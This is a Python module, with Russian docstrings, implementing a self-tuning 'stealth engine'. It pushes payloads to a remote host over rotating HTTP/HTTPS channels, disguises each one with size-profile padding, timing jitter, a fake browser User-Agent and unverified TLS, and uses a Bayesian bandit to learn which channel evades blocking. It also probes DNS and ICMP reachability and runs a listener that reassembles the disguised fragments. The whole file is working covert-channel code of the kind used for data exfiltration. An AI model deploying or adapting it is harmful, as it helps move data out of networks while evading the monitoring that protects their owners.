"""Adaptive stealth engine: учится на каждом результате отправки."""
import base64, json, math, os, random, socket, ssl, struct, subprocess
import platform, threading, time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
__version__ = "1.0.0"
_IS_WIN = platform.system() == "Windows"

class BayesianUpdater:
    def __init__(self, alpha=1.0, beta=1.0):
        self.a0, self.b0 = alpha, beta
        self.ch = {}; self.total = 0; self._lock = threading.Lock()
    def update(self, ch, ok, w=1.0):
        with self._lock:
            a, b = self.ch.get(ch, (self.a0, self.b0))
            self.ch[ch] = (a + (w if ok else 0.0), b + (0.0 if ok else w))
            self.total += 1
    def p(self, ch):
        a, b = self.ch.get(ch, (self.a0, self.b0))
        return a / (a + b)
    def ucb(self, ch, explore=0.1):
        n = sum(self.ch.get(ch, (0, 0)))
        if n <= 0:
            return float("inf")
        return self.p(ch) + explore * math.sqrt(2 * math.log(max(2, self.total)) / n)
    def as_dict(self):
        return {k: {"alpha": v[0], "beta": v[1], "p": round(self.p(k), 3)}
                for k, v in self.ch.items()}

class PolymorphicEncoder:
    PROFILES = {"HTTPS-POST": {"size": 517, "jitter": 60},
                "HTTP-POST": {"size": 350, "jitter": 40},
                "HTTPS-HEADERS": {"size": 512, "jitter": 60},
                "HTTP-HEADERS": {"size": 350, "jitter": 40}}
    def encode(self, payload, channel):
        prof = self.PROFILES.get(channel, {"size": 256, "jitter": 30})
        pad = max(0, prof["size"] - len(payload) - 2)
        body = struct.pack(">H", len(payload)) + payload + \
               bytes(random.randint(0, 255) for _ in range(pad))
        return {"channel": channel, "body": body,
                "delay_ms": random.uniform(0, prof["jitter"]),
                "seq": random.randint(0, 65535)}
    @staticmethod
    def decode(frag):
        body = frag.get("body", b"")
        if len(body) < 2:
            return b""
        n = struct.unpack(">H", body[:2])[0]
        return body[2:2 + n]

class _RecvHandler(BaseHTTPRequestHandler):
    store = []
    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        d = json.loads(self.rfile.read(n) or b"{}")
        body = base64.b64decode(d.get("body", ""))
        _RecvHandler.store.append(
            {"seq": d.get("seq"), "channel": d.get("channel"),
             "text": PolymorphicEncoder.decode({"body": body}).decode("utf-8", "replace")})
        self.send_response(200)
        self.send_header("Content-Length", "2")
        self.end_headers(); self.wfile.write(b"ok")
    def log_message(self, *a):
        pass

class StealthListener(ThreadingHTTPServer):
    """Точка выхода: приём замаскированных фрагментов."""
    def __init__(self, host="127.0.0.1", port=8703):
        super().__init__((host, port), _RecvHandler)
    @property
    def port(self):
        return self.server_address[1]
    def messages(self):
        return list(_RecvHandler.store)
    @staticmethod
    def main(host="127.0.0.1", port=8703):
        StealthListener(host, port).serve_forever()

class StealthEngine:
    DELIVERY = ("HTTPS-POST", "HTTP-POST", "HTTPS-HEADERS", "HTTP-HEADERS")
    PROBE_ONLY = ("DNS", "ICMP")
    def __init__(self, state_file=None):
        self.bayes = BayesianUpdater()
        self.state_file = state_file
        self.stats = {"sends": 0, "success": 0, "failed": 0, "by_channel": {}}
        self._lock = threading.Lock()
        if state_file and os.path.exists(state_file):
            self.load()

    def _http(self, host, port, timeout, https, headers_mode, body=None):
        import urllib.request
        url = "%s://%s:%d/recv" % ("https" if https else "http", host, port)
        ctx = ssl._create_unverified_context() if https else None
        req = urllib.request.Request(
            url, data=body, method="POST",
            headers={"User-Agent": "Mozilla/5.0",
                     "Content-Type": "application/octet-stream"})
        if headers_mode:
            req.add_header("X-Shape", "polymorphic")
        urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return True

    def _dns(self, host, timeout):
        q = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + \
            b"\x07example\x03com\x00\x00\x01\x00\x01"
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(timeout)
        s.sendto(q, (host, 53)); s.recvfrom(512); s.close()
        return True

    def _icmp(self, host, timeout):
        cmd = (["ping", "-n", "1", "-w", str(int(timeout * 1000)), host] if _IS_WIN
               else ["ping", "-c", "1", "-W", str(int(timeout)), host])
        return subprocess.run(cmd, capture_output=True, timeout=timeout * 2).returncode == 0

    def probe(self, target, timeout=3.0):
        """Вход: проверка доступности каналов. Выход: list результатов."""
        host, _, ps = target.partition(":")
        results = []
        tests = [("DNS", lambda: self._dns(host, timeout)),
                 ("ICMP", lambda: self._icmp(host, timeout))]
        for name, fn in tests:
            t0 = time.time(); ok = False
            try: ok = bool(fn())
            except Exception: ok = False
            self.bayes.update(name, ok)
            results.append({"channel": name, "ok": ok,
                            "latency_ms": round((time.time() - t0) * 1000, 1)})
        return results

    def send(self, payload, target, timeout=3.0):
        """Вход: payload + target host:port. Выход: result dict."""
        if isinstance(payload, str):
            payload = payload.encode("utf-8")
        host, _, ps = target.partition(":")
        port = int(ps) if ps else 8703
        order = sorted(self.DELIVERY, key=lambda c: -self.bayes.ucb(c))
        attempts = []
        for ch in order:
            frag = PolymorphicEncoder().encode(payload, ch)
            time.sleep(frag["delay_ms"] / 1000.0)
            body = json.dumps({"seq": frag["seq"], "channel": ch,
                               "body": base64.b64encode(frag["body"]).decode()}).encode()
            t0 = time.time(); ok = False
            try:
                ok = self._http(host, port, timeout,
                                ch.startswith("HTTPS"), "HEADERS" in ch, body)
            except Exception: ok = False
            dt = (time.time() - t0) * 1000
            self.bayes.update(ch, ok)
            attempts.append({"channel": ch, "ok": ok, "latency_ms": round(dt, 1)})
            with self._lock:
                self.stats["sends"] += 1
                self.stats["success" if ok else "failed"] += 1
                bc = self.stats["by_channel"].setdefault(ch, {"ok": 0, "fail": 0})
                bc["ok" if ok else "fail"] += 1
            if ok:
                if self.state_file: self.save()
                return {"success": True, "channel": ch, "attempts": attempts,
                        "latency_ms": round(dt, 1), "target": target,
                        "fragment_size": len(frag["body"])}
        if self.state_file: self.save()
        return {"success": False, "channel": None, "attempts": attempts,
                "target": target}

    def get_channels(self):
        return self.bayes.as_dict()
    def get_stats(self):
        with self._lock: return dict(self.stats)
    def save(self):
        try:
            os.makedirs(os.path.dirname(self.state_file) or ".", exist_ok=True)
            with open(self.state_file, "w", encoding="utf-8") as f:
                json.dump({"channels": self.bayes.as_dict(), "stats": self.stats},
                          f, ensure_ascii=False)
        except OSError: pass
    def load(self):
        try:
            with open(self.state_file, encoding="utf-8") as f:
                d = json.load(f)
            for k, v in (d.get("channels") or {}).items():
                self.bayes.ch[k] = (v["alpha"], v["beta"])
            self.stats.update(d.get("stats") or {})
        except (OSError, ValueError, KeyError): pass
